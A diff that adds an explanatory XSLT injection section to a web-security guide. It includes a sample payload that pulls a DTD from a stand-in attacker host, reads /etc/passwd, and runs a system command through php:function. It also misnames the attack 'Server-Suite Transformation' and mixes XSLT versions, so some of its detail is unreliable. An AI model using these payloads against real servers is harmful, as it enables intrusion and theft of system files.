@@ -193,4 +193,45 @@ To prevent SSI injection attacks, developers should validate user input and rest
 
 ## eXtensible Stylesheet Language Transformation (XSLT)
 
+XSLT (eXtensible Stylesheet Language Transformations) is a language used to transform XML documents into other formats, such as HTML. XSLT is commonly employed in web applications to generate content dynamically. XSLT transformations are performed on the server, and the resulting content is sent to the client.
 
+XSLT Server-Suite Transformation (XSLT SST) is a vulnerability that arises when an attacker can manipulate XSLT transformations performed on the server. Attackers exploit weaknesses in how XSLT transformations are handled, allowing them to inject and execute arbitrary code on the server.
+
+To exploit XSLT SST, an attacker can provide a malicious payload as input to the vulnerable application. The application will then perform an XSLT transformation on the malicious payload, allowing the attacker to execute arbitrary code on the server.
+
+Example of exploitation:
+    
+    ```xml
+    <?xml version="1.0"?>
+    <!DOCTYPE xsl:stylesheet [
+    <!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">
+    %remote;
+    %all;
+    ]>
+    <xsl:stylesheet version="1.0"
+    xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+    <xsl:template match="/">
+    <html>
+    <body>
+    <h2>My CD Collection</h2>
+    <table border="1">
+    <tr bgcolor="#9acd32">
+    <th>Title</th>
+    <th>Artist</th>
+    </tr>
+    <tr>
+    <td><xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')"/></td>
+    <td>Bob Dylan</td>
+    </tr>
+    </table>
+    </body>
+    </html>
+    </xsl:template>
+    </xsl:stylesheet>
+    ```
+
+If an XSLT processor supports PHP functions, we can call a PHP function that executes a local system command to obtain RCE. For instance, we can call the PHP function system to execute a command:
+
+<xsl:value-of select="php:function('system','id')" />
+
+To prevent XSLT SST attacks, developers should validate user input and restrict the XSLT transformations that the application can perform. Additionally, developers should avoid using user-supplied XSLT transformations in server-side code.
